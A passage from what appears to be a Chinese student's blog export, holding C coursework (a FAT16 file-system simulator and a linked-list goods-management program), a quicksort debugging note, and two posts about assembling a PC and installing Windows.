= getchar(); if(c == -1)&#123; flag = 0; clust[nxtClust].byte[i] = 0; break; &#125;else clust[nxtClust].byte[i] = c; &#125; clust[nxtClust].status = 0xFFFF; if(flag == 0) break; if(Clust_Judge_Status(clust[nxtClust].status) == 0) nxtClust = clust[nxtClust].status; else&#123; int tempClust = 2; while(Clust_Judge_Status(clust[tempClust].status) != 2) tempClust++; clust[nxtClust].status = tempClust; nxtClust = tempClust; &#125; &#125; /* 边写文件边开新的簇 */ &#125;else if(ISCMD(\"format\"))&#123; printf(\"Are you sure to FORMAT this disk? (y/n): \"); gets(a); if(ISCMD(\"y\") || ISCMD(\"Y\"))&#123; printf(\"Once again. You'll lose your data, continue? (y/n): \"); gets(a); if(ISCMD(\"y\") || ISCMD(\"Y\"))&#123; printf(\"formating... \"); Data_ReadOrWrite(2); Data_Create_New(); Data_ReadOrWrite(3); Data_ReadOrWrite(1); Data_Read(); Data_ReadOrWrite(3); printf(\"done.\\n\\n\"); &#125; &#125; &#125;else if(ISCMD(\"save\"))&#123; printf(\"Are you sure to quit with saving? (y/n): \"); scanf(\"%s\", a); if(ISCMD(\"y\") || ISCMD(\"Y\"))&#123; Data_Save(); return FALSE; &#125; &#125;else&#123; printf(\"unknown command \\\"%s\\\"\\n\",str); &#125; return TRUE;//继续循环 &#125;bool Data_ReadOrWrite(const int t)&#123;//done switch(t)&#123; case 1: //只读 fp = fopen(\"fat16_data.bin\", \"rb\"); return fp != NULL; case 2: //可写 fp = fopen(\"fat16_data.bin\", \"wb\"); return fp != NULL; case 3: fclose(fp); return 1; &#125;&#125;void Data_Initialize()&#123;//done if(Data_ReadOrWrite(1) == FALSE)&#123; printf(\"Disk data doesn't exist. \\nCreating a new one...\\n\"); Data_Create_New(); &#125; Data_ReadOrWrite(3);//关闭文件 Data_ReadOrWrite(1);//只读模式 Data_Read(); printf(\"Data loaded successfully.\\n\\n\"); Clust_now = 1; Data_ReadOrWrite(3);&#125;void Data_Read()&#123; fseek(fp, BYTES_PER_SECTOR, SEEK_CUR);//跳过DBR区域 for(int i = 0; i &lt;= -1 + SECTORS_PER_FAT * BYTES_PER_SECTOR &gt;&gt; 1; i++)//注意，这里是从0开始读 clust[i].status = (int) File_Scanf_Number(2);//读取FAT1 fseek(fp, SECTORS_PER_FAT * BYTES_PER_SECTOR, SEEK_CUR);//跳过FAT2 fread(clust[1].byte, sizeof(char), BYTES_PER_SECTOR * SECTORS_ROOT, fp);//读取根目录 for(int i = 2; i &lt;= CLUST_MAX_COUNT; i++) fread(clust[i].byte, sizeof(char), BYTES_PER_SECTOR * SECTORS_PER_CLUST, fp);//读取数据区 &#125;void Data_Create_New()&#123;//done Data_ReadOrWrite(2); Data_DBR_Print(); for(int k = 0; k &lt;= 1; k++)&#123;//填充FAT区域 fprintf(fp, \"%c\", 0xFF); fprintf(fp, \"%c\", 0xFF); for(int i = 1; i &lt;= SECTORS_PER_FAT * BYTES_PER_SECTOR - 2; i++) fprintf(fp, \"%c\", 0); &#125; fi *p = (fi*) malloc(sizeof(fi)); Make_a_New_File(p, TRUE); strcpy(p-&gt;name[0], \".\"); File_Printf_32Bytes(p); strcpy(p-&gt;name[0], \"..\"); File_Printf_32Bytes(p); free(p); for(int i = 2; i &lt; (SECTORS_PER_CLUST * CLUST_MAX_COUNT) * BYTES_PER_SECTOR; i++) fprintf(fp, \"%c\", 0);//把空扇区刷为0 Data_ReadOrWrite(3);&#125;void Data_Save()&#123; Data_ReadOrWrite(2); Data_DBR_Print(); for(int j = 0; j &lt;= 1; j++) for(int i = 0; i &lt;= -1 + SECTORS_PER_FAT * BYTES_PER_SECTOR &gt;&gt; 1; i++) File_Printf_Number(clust[i].status, 2);//打印FAT表，打印两份 fwrite(clust[1].byte, sizeof(char), BYTES_PER_SECTOR * SECTORS_ROOT, fp);//保存根目录 for(int i = 2; i &lt;= CLUST_MAX_COUNT; i++) fwrite(clust[i].byte, sizeof(char), BYTES_PER_SECTOR * SECTORS_PER_CLUST, fp);//保存数据区 Data_ReadOrWrite(3);&#125;fi *Filelist_Search_File(char *name, bool IsDir)&#123; char a[20], b[20]; Str_Cut_Name_Into_Two(name, a, b); for(fi *p = HEAD; p != NULL; p = p-&gt;next) if(strcmp(a, p-&gt;name[0]) == 0 &amp;&amp; strcmp(b, p-&gt;name[1]) == 0 &amp;&amp; p-&gt;dir == IsDir) return p;//找到了 return NULL;//没找到 &#125;void Filelist_Print()&#123; printf(\"\\n\\n\"); for(fi *p = HEAD; p != NULL; p = p-&gt;next)&#123; Date_Print(p-&gt;date); printf(\" \"); Time_Print(p-&gt;time); printf(\" \"); printf(\"%s\\t\\t\", p-&gt;dir == TRUE?\"&lt;DIR&gt; \":\"&lt;FILE&gt;\"); printf(\"%s\",p-&gt;name[0]); if(!p-&gt;dir &amp;&amp; p-&gt;name[1][0] != 0) printf(\".%s\", p-&gt;name[1]); printf(\"\\n\"); &#125; printf(\"\\n\\n\");&#125;void Filelist_Update(int id)&#123; if(id &lt;= 0) return; fi t; for(int i = 0; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR / 32; i++) if(Str_Read_32Bytes(clust[id].byte + 32 * i, &amp;t))&#123;//如果读取成功，就申请一段新内存来存文件 fi *p = (fi *) malloc(sizeof(fi)); *p = t; p-&gt;next = NULL; Filelist_Add_File(p); &#125; if(!Clust_Judge_Status(clust[id].status))//如果这个簇后面还有文件 就继续读取 Filelist_Update(clust[id].status); else return;&#125;void Filelist_Destroy()&#123; FileCnt = 0; fi *p; for(fi *pre = HEAD; pre != NULL; pre= p)&#123; p = pre-&gt;next; free(pre); &#125; HEAD = NULL;&#125;void Filelist_Add_File(fi *p)&#123; p-&gt;next = HEAD;//直接在头部添加上新结点 HEAD = p; FileCnt++;&#125;int Clust_Judge_Status(int t)&#123; if(t &gt;= 0x2 &amp;&amp; t &lt;= 0xFFEF) return 0;//还有连接的簇 else if(t == 0xFFFF) return 1;//文件结束 else return 2;//空簇 &#125;bool Str_Read_32Bytes(char *str, fi *a)&#123;//done Str_Scanf_String(str, 8, a-&gt;name[0]); Str_Scanf_String(str + 8, 3, a-&gt;name[1]);//这下面吧0xE5改为了-27 （ascii码相同） if(a-&gt;name[0][0] == -27 || a-&gt;name[0][0] == 0)&#123;//如果该文件已经被删除或者不存在 fseek(fp, 21, SEEK_CUR);//直接跳过剩下32 - 11 = 21个字节 return FALSE; &#125; str = str + 11; if(*str++ == 0x10) //该文件是个目录 a-&gt;dir = TRUE; else a-&gt;dir = FALSE; str += 10;//跳过10个无意义字节 a-&gt;time = Str_Scanf_Number(str, 2);//读取时间 str += 2; a-&gt;date = Str_Scanf_Number(str, 2);//读取日期 str += 2; a-&gt;clust = Str_Scanf_Number(str, 2);//读取首簇号 str += 2; a-&gt;len = Str_Scanf_Number(str, 4);//读取文件大小 str += 4; return TRUE;&#125;void File_Printf_32Bytes(fi *t)&#123; File_Printf_String(t-&gt;name[0], 8); File_Printf_String(t-&gt;name[1], 3); if(t-&gt;dir == TRUE) fprintf(fp, \"%c\", 0x10); else fprintf(fp, \"%c\", 0x20); for(int i = 1; i &lt;= 10; i++) fprintf(fp, \"%c\", 0xFF); File_Printf_Number(t-&gt;time, 2); File_Printf_Number(t-&gt;date, 2); File_Printf_Number(t-&gt;clust, 2); File_Printf_Number(t-&gt;len, 4);&#125;void Str_Printf_32Bytes(char *str, fi *t)&#123; strncpy(str, t-&gt;name[0], 8); str += 8; strncpy(str, t-&gt;name[1], 3); str += 3; if(t-&gt;dir == TRUE) *str++ = 0x10; else *str++ = 0x20; for(int i = 1; i &lt;= 10; i++) *str++ = 0xFF; Str_Printf_Number(str, t-&gt;time, 2); str += 2; Str_Printf_Number(str, t-&gt;date, 2); str += 2; Str_Printf_Number(str, t-&gt;clust, 2); str += 2; Str_Printf_Number(str, t-&gt;len, 4);&#125;void Str_Cut_Name_Into_Two(char *name, char *a, char *b)&#123; char temp[30]; strcpy(temp, name); char *t = temp; if(strcmp(t, \"..\") == 0 || strcmp(t, \".\") == 0) strcpy(a, temp); else&#123; while(*t != 0 &amp;&amp; *t != '.') t++; if(*t == 0) *(t + 1) = 0; *t = 0; strcpy(a, temp); strcpy(b, t + 1); &#125;&#125;void Filelist_Bubble_Sort()&#123; for(int i = 0; i &lt; FileCnt; i++) for(fi *p = HEAD; p-&gt;next != NULL; p = p-&gt;next) if(strcmp(p-&gt;name[0], p-&gt;next-&gt;name[0]) &gt; 0)&#123; fi _a, _b, *pnx;//交换函数 pnx = p-&gt;next; _a = *p; _b = *pnx; *p = _b; *pnx = _a; p-&gt;next = _a.next; pnx-&gt;next = _b.next; &#125;&#125;void Data_DBR_Print()&#123;//done fprintf(fp, \"%c%c%c\",0xEB ,0x3C ,0x90 ); fprintf(fp, \"ByMrh929\"); File_Printf_Number(BYTES_PER_SECTOR, 2); File_Printf_Number(SECTORS_PER_CLUST, 1); File_Printf_Number(RESERVED_SECTORS, 2);//保留扇区数 File_Printf_Number(2, 1);//FAT数量 File_Printf_Number(512, 2);//根目录项数 File_Printf_Number(SECTORS_PER_FAT, 2); File_Printf_Number(63, 2); File_Printf_Number(0, 4); fprintf(fp, \"FAT16 \"); for(int i = 1; i &lt;= 475; i++) fprintf(fp, \"%c\", 0x99); File_Printf_Number(43605, 2);&#125;void Data_Add_A_File(fi *F, int id, int k)&#123; char *p = clust[id].byte; p += k * 32;//将指针移动到需要修改的那个文件信息之前 int newclust = 2; while(clust[newclust].status != 0) newclust++;//寻找一个簇，用来存放文件的信息 clust[newclust].status = 0xFFFF; memset(clust[newclust].byte, 0, sizeof(clust[newclust].byte)); F-&gt;clust = newclust; Str_Printf_32Bytes(p, F); &#125;void Str_Printf_Number(char *str, long long sum, int n)&#123; long long m; for(int i = 0; i &lt; n; i++)&#123; m = sum % 256; *str++ = m;//输出一位数并且指针后移 sum /= 256; &#125;&#125;long long Str_Scanf_Number(char *str, int n)&#123;//done long long sum = 0; char t; for(int i = 0; i &lt; n ; i++)&#123; t = *str++; //读取一位并且指针后移 sum += t * (1 &lt;&lt; (i * 8)); &#125; return sum;&#125;void File_Printf_Number(long long sum, int n)&#123;//done long long m; for(int i = 0; i &lt; n; i++)&#123; m = sum % 256; fprintf(fp, \"%c\", m); sum /= 256; &#125;&#125;long long File_Scanf_Number(int n)&#123;//done long long sum = 0; char t; for(int i = 0; i &lt; n ; i++)&#123; fscanf(fp, \"%c\", &amp;t); sum += t * (1 &lt;&lt; (i * 8)); &#125; return sum;&#125;void Str_Scanf_String(char *str, int t, char *dest)&#123;//done int i = 0; while(i &lt; t)&#123; if(*(str + i) != ' ' &amp;&amp; *(str + i) != 0)&#123; *(dest + i) = *(str + i); i++; &#125;else break; &#125; *(dest + i) = 0;&#125;void File_Printf_String(char *str, int n)&#123; for(int i = 0; i &lt; n; i++) fprintf(fp, \"%c\", *(str + i));&#125;void Time_Print(int t)&#123;//done int h, m, s; s = (t &amp; 0x1F) * 2;//取后五位 t &gt;&gt;= 5; m = t &amp; 0x3F; t &gt;&gt;= 6; h = t &amp; 0x1F; printf(\"%02d:%02d:%02d\", h, m, s);&#125;void Date_Print(int t)&#123;//done int y, m, d; d = t &amp; 0x1F; t &gt;&gt;= 5; m = t &amp; 0xF; t &gt;&gt;= 4; y = (t &amp; 0xFF) + 1980; printf(\"%04d/%02d/%02d\", y, m, d); &#125;int Time_Get()&#123;//done time_t t; struct tm *lt; time (&amp;t);//获取Unix时间戳。 lt = localtime (&amp;t);//转为时间结构。 return (lt-&gt;tm_hour * 2048) + (lt-&gt;tm_min * 32) + (lt-&gt;tm_sec / 2);&#125;int Date_Get()&#123;//done time_t t; struct tm *lt; time (&amp;t);//获取Unix时间戳。 lt = localtime (&amp;t);//转为时间结构。 lt-&gt;tm_year += 1900; lt-&gt;tm_mon ++;//0代表1月 return (lt-&gt;tm_year - 1980) * 512 + (lt-&gt;tm_mon * 32) + (lt-&gt;tm_mday);&#125;void Dir_Change(char *p, bool NEW)&#123; if(NEW == FALSE) dir_now--; else strcpy(dir[++dir_now], p);&#125;void Dir_Print()&#123; printf(\"\\\\\"); for(int i = 0; i &lt;= dir_now; i++) printf(\"%s\\\\\",dir[i]);&#125;int Dir_Find_Empty(int id)&#123; for(int i = 0; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR / 32; i++) if(clust[id].byte[i * 32] == -27 || clust[id].byte[i * 32] == 0) return i; return -1;//没找到一个空位 &#125;void Make_a_New_File(fi *p, bool IsDir)&#123; p-&gt;clust = 1; p-&gt;len = 0; p-&gt;dir = IsDir; p-&gt;time = Time_Get(); p-&gt;date = Date_Get(); p-&gt;name[1][0] = 0;&#125;void Clust_Clear_File(int id)&#123; if(Clust_Judge_Status(clust[id].status) == 0)//还有连接的簇 Clust_Clear_File(clust[id].status); clust[id].status = 0;//标记为未使用 return;&#125;void Clust_Clear_Dir(int id)&#123; //先搜索这个文件夹下有哪些子文件和目录，把它们删除，然后再删除自身 if(id &lt;= 0) return; fi t; for(int i = 2; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR / 32; i++) if(Str_Read_32Bytes(clust[id].byte + 32 * i, &amp;t))&#123;//如果读取成功，就申请一段新内存来存文件 if(t.dir == TRUE) Clust_Clear_Dir(t.clust);//递归删除子目录 else Clust_Clear_File(t.clust);//递归删除子文件 *(clust[id].byte + 32 * i) = 0xE5;//标记为删除 &#125; if(Clust_Judge_Status(clust[id].status) == 0)//如果这个簇后面还有文件 就继续读取 Clust_Clear_Dir(clust[id].status);&#125;void Manu_Print()&#123;//done printf(\"This system supports the following commands:\\n\\n\"); printf(\"ls/dir\\t\\t\\t\\t\\tShow the files and folders contained.\\n\"); printf(\"cd [DIR]\\t\\t\\t\\tEnter an appinted folder.\\n\"); printf(\"mkdir [DIR]\\t\\t\\t\\tCreate a folder.\\n\"); printf(\"create [NAME]\\t\\t\\t\\tCreate a file.\\n\"); printf(\"rmdir [DIR]\\t\\t\\t\\tDelete a folder.\\n\"); printf(\"rm [NAME]\\t\\t\\t\\tDelete a file.\\n\"); printf(\"read [NAME]\\t\\t\\t\\tRead a file.\\n\"); printf(\"write [NAME]\\t\\t\\t\\tWrite a file.\\n\"); printf(\"format\\t\\t\\t\\t\\tFormat this disk.(be careful)\\n\"); printf(\"save\\t\\t\\t\\t\\tSave this disk and quit.(without which you'll lose your data)\\n\\n\\n\");&#125;","categories":[{"name":"project","slug":"project","permalink":"https://mrh1s.top/categories/project/"}],"tags":[]},{"title":"排序算法的一点小心得","slug":"e6-8e-92-e5-ba-8f-e7-ae-97-e6-b3-95-e7-9a-84-e4-b8-80-e7-82-b9-e5-b0-8f-e5-bf-83-e5-be-97","date":"2019-01-09T07:01:14.000Z","updated":"2019-05-08T14:21:38.588Z","comments":true,"path":"posts/e0221437/","link":"","permalink":"https://mrh1s.top/posts/e0221437/","excerpt":"","text":"手写了两种排序算法，但是写快排的时候，数据一大就开始死循环 原来是我判断循环跳出条件那个地方出了一点问题，cmp函数里面我写的时候当a&lt;b时才返回真，而当a==b时，程序会认为两个元素需要交换，从而无限次地交换，死循环 一句话总结：快排一定要 跳过两个元素相等的情况 #include&lt;cstdio&gt;#include&lt;ctime&gt;#include&lt;cstdlib&gt;#include&lt;algorithm&gt;using namespace std;const int MAX = 100000;int a[MAX];bool cmp(int a, int b)&#123; return a &lt; b;&#125;void set_array(int n)&#123; for(int i = 1; i &lt;= n; i++) a[i] = rand() % 100;&#125;void print(int n)&#123; for(int i = 1; i &lt;= n; i++) printf(\"%d \", a[i]); printf(\"\\n\\n\");&#125;void bubble_sort(int n)&#123; for(int i = 1; i &lt;= n - 1; i++) for(int j = 1; j &lt;= n - i; j++) if(!cmp(a[j], a[j + 1])) swap(a[j], a[j + 1]);&#125;void quick_sort(int s, int e)&#123; if(s &gt;= e ) return; int i = s, j = e; while(i &lt; j)&#123; /* 下方while中，如果两个元素相等，必须跳过，因为一旦不跳过 程序将陷入死循环 即加上 a[i]==a[j] */ while(i &lt; j &amp;&amp; cmp(a[i], a[j]) || a[i] == a[j]) j--; swap(a[i], a[j]); while(i &lt; j &amp;&amp; cmp(a[i], a[j]) || a[i] == a[j]) i++; swap(a[i], a[j]); &#125; quick_sort(s, i-1); quick_sort(i+1, e);&#125;int main()&#123; srand(time(NULL)); int n,CHOICE; scanf(\"%d\",&amp;n); set_array(n); print(n); scanf(\"%d\",&amp;CHOICE); switch(CHOICE)&#123; case 1:&#123; bubble_sort(n); break; &#125; case 2:&#123; quick_sort(1, n); break; &#125; &#125; print(n);&#125; ​","categories":[{"name":"c-learn","slug":"c-learn","permalink":"https://mrh1s.top/categories/c-learn/"}],"tags":[]},{"title":"网安课答辩-比特币与区块链","slug":"e7-bd-91-e5-ae-89-e8-af-be-e7-ad-94-e8-be-a9-e6-af-94-e7-89-b9-e5-b8-81-e4-b8-8e-e5-8c-ba-e5-9d-97-e9-93-be","date":"2019-01-03T09:35:21.000Z","updated":"2019-05-04T15:39:44.418Z","comments":true,"path":"posts/3cf48918/","link":"","permalink":"https://mrh1s.top/posts/3cf48918/","excerpt":"","text":"&lt;!–￼0–&gt;","categories":[{"name":"project","slug":"project","permalink":"https://mrh1s.top/categories/project/"}],"tags":[]},{"title":"记第一次电脑组装（二）","slug":"e8-ae-b0-e7-ac-ac-e4-b8-80-e6-ac-a1-e7-94-b5-e8-84-91-e7-bb-84-e8-a3-85-ef-bc-88-e4-ba-8c-ef-bc-89","date":"2018-12-31T06:13:12.000Z","updated":"2019-05-04T15:39:44.417Z","comments":true,"path":"posts/1879b15e/","link":"","permalink":"https://mrh1s.top/posts/1879b15e/","excerpt":"","text":"组装系统 这一步通常特别简单，但是我整整弄了一天 第一步是在其他电脑上下载老毛桃装机软件，制作U盘镜像 第二步将U盘插入电脑，设置U盘引导启动 便会进入PE维护系统 首先新硬盘是没有分区的，我们打开disk genious 选择自己的硬盘 点击快速分区，填入相关设置，一般固态硬盘分一个区就好了，机械硬盘可以多分几个区，方便分类存放文件 第三步安装Win10，老毛桃自带win10镜像下载入口，直接点击下载即可，安装至固态硬盘。 等待五分钟之后，系统安装成功，准备重启！ （这里我卡了几个小时，系统安装成功但是重启之后看不到引导，让我一脸懵逼） 最终找到原因：华硕主板需要开启CSM 开启之后，硬盘引导一切正常。 卸载掉所有360全家桶和垃圾软件 并激活系统 （找八国联军买激活码hhhhh，淘宝12块钱还支持联网验证） 到这里装机就告一段落了 这是我的配置： SSD，真香！ Win10，真香！ 这次装机总共耗时两天，总归有所收获，咸鱼终于摆脱了电脑城奸商的敲诈，期待下一次的装机！","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[]},{"title":"记第一次电脑组装（一）","slug":"e8-ae-b0-e7-ac-ac-e4-b8-80-e6-ac-a1-e7-94-b5-e8-84-91-e7-bb-84-e8-a3-85-ef-bc-88-e4-b8-80-ef-bc-89","date":"2018-12-29T18:02:13.000Z","updated":"2019-05-04T15:39:44.417Z","comments":true,"path":"posts/286f5d86/","link":"","permalink":"https://mrh1s.top/posts/286f5d86/","excerpt":"","text":"写在开头 之前从来没有组装过电脑，而且我所用过电脑都是电脑城奸商们提供的“良品”。 这次的组装电脑我已经等待三个月了，从开学的规划预算，到双十一购买配件，到元旦回家装机。 预算：3000 左右，主要功能：用来日常上网使用，cpu性能要与i5 8400 差不多，日后需要具备升级1066显卡的潜力（升级后主要打游戏为主）。 找人给出如下配置单： 其中除开1065 大概就是3900的样子。不过我双十一去买U的时候U+主板降价到了1800（加上某些原因，跟卖家吵了一架然后退掉了，买了同学的二手U+华硕primeM360-K，1400元） 三星PM961听说售后不太好，正好双十一的时候intel p760 降价100，于是毫不犹豫转战intel 最终所有配件3000元拿下，是一个很理想的价格了 开始装机教程来源：https://zhuanlan.zhihu.com/p/52235439 配件全家福 同学的二手板子，安装CPU这一步已经省掉了 装内存 这步很简单，拨开卡扣，大力出奇迹 装固态 看到中间的拉环了吗？其实这个是用来固定固态硬盘的，把拉环拉出，然后插入固态，再接上拉环（这样的设计比螺丝钉更人性化） 装cpu散热器 这一步稍显复杂，但是并不难，先把散热器的整体元件拼接完成，然后在cpu后盖上涂上硅脂（黄豆大小即可，可以不用涂抹均匀，因为散热器按压下去的时候会自动压匀） 还有一个注意事项就是散热器的朝向，按照教程来讲是把风扇对着内存即可，我总结出来的是风扇的方向要与主板的接口（描述不太准确，也就是我们常说的机箱后面）相反，才方便风扇吸风然后把热量排出去。 后面就真的到了玄学装机时间了，具体不多说，各种接口如图所示 我自己的电脑需要接： 1. 电源接口（24针那个，特别难插） 2. CPU供电线 （8针） 3. USB3.0线（特别难插，插上去就基本上拔不下来） 4. HD AUDIO 5. 机箱上的指示灯相关的线（一共五根 两小三大） 6. SATA线接硬盘 接线并不难，难的在布线上面，我一开始就把主板的线全部接好了，以至于后面放回机箱后电线杂乱，不得不全部拔掉重来。 建议：第一次装先熟悉一次各种线的走向，然后提前把线部署好，等主板装好之后再接线。 而且电源线可以最后再接，因为装电源又是一个需要考虑空间的活，一切进行完成之后再接上机械硬盘，因为这个时候大多线的走向已经固定了，就不会因为杂乱的线而缠上硬盘。 最终成果可以看到，我这个机箱内部是比较整洁的，像我这样有强迫症的人表示其实还是很乱。。。 所以布线很重要！布线很重要！布线很重要！重要的事情说三遍！ GX450那一个隔层里面是各类电线，其实电源里面给了特别多的线，真正用得上的也就那几根，其余的最好是用一个袋子缠起来。 hhhhh 中途接线，没有图片真的不是因为我懒啊！是因为我装机装到后面心态爆炸了！实在没有太多的精力去拍照了！ 至于装系统后的琐事，请听下回分解。","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[]},{"title":"商品管理系统","slug":"e5-95-86-e5-93-81-e7-ae-a1-e7-90-86-e7-b3-bb-e7-bb-9f","date":"2018-12-20T12:13:14.000Z","updated":"2019-05-05T05:46:01.664Z","comments":true,"path":"posts/59c8895d/","link":"","permalink":"https://mrh1s.top/posts/59c8895d/","excerpt":"","text":"大一上C语言期末作业动态链表真的好烦啊 这次主要纠正了自己的一个错误思想一个链表的链表头是一个指针，而不是一个结点所以，每次操作一个链表的时候，要传入指针的指针才能达到修改第一个结点的目的 GoodList *Head; //这是指向链表头的指针Change(&amp;Head); //传入指针的指针 实验报告 #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include &lt;stdbool.h&gt;#define MAX 100//最大商品数量 int CurrentCnt = 0;//当前商品数量 #define MAX_ID_LEN 30#define MAX_NAME_LEN 30#define MAX_PRICE_LEN 30#define MAX_DISCOUNT_LEN 30typedef struct&#123;//商品信息结构 char good_id[MAX_ID_LEN]; char good_name[MAX_NAME_LEN]; int good_price; char good_discount[MAX_DISCOUNT_LEN]; int good_amount; int good_remain;&#125;GoodInfo;typedef struct node&#123;//商品链表结点 GoodInfo data; struct node *next;&#125;GoodList;FILE *fp;//文件指针用来操作文件 int file_read()&#123; fp = fopen(\"goodinfo.txt\", \"r\");//读取文件 return fp != NULL;&#125;void file_write()&#123; fp= fopen(\"goodinfo.txt\", \"w\");//写文件 &#125;void file_close()&#123; fclose(fp); &#125;void pause()&#123; system(\"pause\"); system(\"cls\");&#125;bool check_nullfile()&#123;//检查商品文件是否存在或者是否为空 if(file_read()) return 0;//找到文件 else&#123; file_write(); file_close(); file_read(); return 1;//没有找到文件 &#125;&#125;//--------------------------------------------------------------------//查找一条商品记录//--------------------------------------------------------------------GoodList* good_find(GoodList *L,char *p)&#123; while(L) if(strcmp(L-&gt;data.good_id, p) == 0) return L; else L = L-&gt;next; return NULL;//没找到 &#125;void info_change(GoodList *L) &#123; printf(\"请输入新的商品信息：\\n\"); printf(\"商品ID：\"); scanf(\"%s\",L-&gt;data.good_id); printf(\"商品名称：\"); scanf(\"%s\",L-&gt;data.good_name); printf(\"商品价格：\"); scanf(\"%d\",&amp;(L-&gt;data.good_price)); printf(\"商品折扣：\"); scanf(\"%s\",L-&gt;data.good_discount); printf(\"商品数量：\"); scanf(\"%d\",&amp;(L-&gt;data.good_amount)); printf(\"商品剩余：\"); scanf(\"%d\",&amp;(L-&gt;data.good_remain)); return;&#125;void info_change_NoRepeat(GoodList *p,GoodList *L) &#123;//p为新增的指针 ， L为链表的头指针 printf(\"请输入新的商品信息：\\n\"); printf(\"商品ID：\"); scanf(\"%s\",p-&gt;data.good_id); while(good_find(L,p-&gt;data.good_id) != NULL)&#123; printf(\"商品ID已存在，请重新输入：\\n\"); printf(\"商品ID：\"); scanf(\"%s\",p-&gt;data.good_id); &#125; printf(\"商品名称：\"); scanf(\"%s\",p-&gt;data.good_name); printf(\"商品价格：\"); scanf(\"%d\",&amp;(p-&gt;data.good_price)); printf(\"商品折扣：\"); scanf(\"%s\",p-&gt;data.good_discount); printf(\"商品数量：\"); scanf(\"%d\",&amp;(p-&gt;data.good_amount)); printf(\"商品剩余：\"); scanf(\"%d\",&amp;(p-&gt;data.good_remain)); return;&#125;void Goodprint(GoodList *p)&#123;//打印单个商品链表节点的信息 printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\"); printf(\"ID:%s\\t名称:%s\\t价格:%d\\t折扣:%s\\t数量:%d\\t剩余:%d\\n\",p-&gt;data.good_id,p-&gt;data.good_name,p-&gt;data.good_price,p-&gt;data.good_discount,p-&gt;data.good_amount,p-&gt;data.good_remain); printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");&#125;void info_init(GoodList **L)&#123;//读取商品文件goodinfo.txt的内容,并建立链表L *L = NULL; CurrentCnt=0; if(check_nullfile())//检查是否为空 printf(\"商品文件不存在，已新建\\n\"); else&#123; GoodList *p, *now; while (!feof(fp))&#123;//一直循环直到把文件读完 p = (GoodList*) malloc(sizeof(GoodList)); if(*L == NULL)&#123;//如果p是第一个非空节点 *L = p; now = p;//暂存之前的节点 &#125;else&#123; now -&gt; next = p; now = p; &#125; fscanf(fp, \"%s\", p-&gt;data.good_id); fscanf(fp, \"%s\", p-&gt;data.good_name); fscanf(fp, \"%d\", &amp;(p-&gt;data.good_price)); fscanf(fp, \"%s\", p-&gt;data.good_discount); fscanf(fp, \"%d\", &amp;(p-&gt;data.good_amount)); fscanf(fp, \"%d\", &amp;(p-&gt;data.good_remain)); CurrentCnt++; &#125; now-&gt;next = NULL;//把尾节点中的指针置0 &#125; file_close();&#125;void DelAll(GoodList **L)&#123;//删除商品文件以及商品链表中的所有信息 char str[MAX_ID_LEN]; printf(\"将会清除所有文件及链表，确定吗？（Y/N）：\"); scanf(\"%s\",str); if(strcmp(str, \"Y\") != 0 &amp;&amp; strcmp(str, \"y\") != 0)&#123; printf(\"操作已取消\\n\\n\"); return; &#125; printf(\"再次询问，这将造成数据的丢失，确定吗？（Y/N）：\"); scanf(\"%s\",str); if(strcmp(str, \"Y\") != 0 &amp;&amp; strcmp(str, \"y\") != 0)&#123; printf(\"操作已取消\\n\\n\"); return; &#125; GoodList *p = *L, *now; while(p != NULL)&#123;//free指针 now = p-&gt;next; free(p); p = now; &#125; remove(\"goodinfo.txt\");//重写文件 printf(\"成功删除所有数据\\n\\n\"); info_init(L);&#125;//--------------------------------------------------------------------//将当前商品链表中的内容存入商品文件goodinfo.txt，存盘后销毁链表L//--------------------------------------------------------------------void info_flush(GoodList **L)&#123; file_write(); GoodList *p = *L, *now; while(p != NULL)&#123;//free指针 fprintf(fp, \"%s\\t%s\\t%d\\t%s\\t%d\\t%d\",p-&gt;data.good_id,p-&gt;data.good_name,p-&gt;data.good_price,p-&gt;data.good_discount,p-&gt;data.good_amount,p-&gt;data.good_remain); now = p-&gt;next; if(now != NULL) fprintf(fp, \"\\n\"); free(p); p = now; &#125; &#125;//--------------------------------------------------------------------//在屏幕上输出所有商品信息//--------------------------------------------------------------------void OutputAll(GoodList *L)&#123; while(L)&#123; Goodprint(L); L = L -&gt; next; &#125;&#125;void info_insert(GoodList **L) &#123; GoodList *p = (GoodList*) malloc(sizeof(GoodList)); GoodList *now = *L; int CHOICE; printf(\"请选择插入方法：\\n\"); printf(\"\\t1.头插法：\\n\"); printf(\"\\t2.尾插法：\\n\"); printf(\"\\t3.中间插入：\\n\\n\"); printf(\"输入您的选择：\"); scanf(\"%d\",&amp;CHOICE); switch(CHOICE)&#123; case 1:&#123;//头插法 info_change_NoRepeat(p, *L); p-&gt;next = *L; *L = p; CurrentCnt++; break; &#125; case 2:&#123;//尾插法 info_change_NoRepeat(p, *L); if(*L == NULL) *L=p; else&#123; while(now-&gt;next != NULL) now = now-&gt;next; now-&gt;next = p; p-&gt;next = NULL;//尾插法 &#125; CurrentCnt++; break; &#125; case 3:&#123; char ID[MAX_ID_LEN]; info_change_NoRepeat(p, *L); printf(\"请输入要将该信息插入到哪个ID后面：\"); scanf(\"%s\",ID); GoodList *now; now=good_find(*L, ID); while(now == NULL)&#123; printf(\"没有找到该ID，请重新输入ID：\"); scanf(\"%s\",ID); now=good_find(*L, ID); &#125; p-&gt;next = now-&gt;next; now-&gt;next = p; CurrentCnt++; break; &#125; &#125; return;&#125;//--------------------------------------------------------------------//删除一条商品记录//--------------------------------------------------------------------void info_dele(GoodList **L) &#123; char ID[MAX_ID_LEN]; GoodList *p; printf(\"请输入要删除的商品ID：\"); scanf(\"%s\",ID); p = good_find(*L, ID); while(p == NULL)&#123; printf(\"未找到该商品，请重新输入ID：\"); scanf(\"%s\",ID); p = good_find(*L, ID); &#125; printf(\"\\n你确定要删除该商品吗（默认否）？(Y/N)：\"); scanf(\"%s\",ID);//读入选项 if(strcmp(ID, \"Y\") == 0||strcmp(ID, \"y\") == 0)&#123; if(*L == p)&#123; *L = p-&gt;next; free(p); &#125;else&#123; GoodList* now = 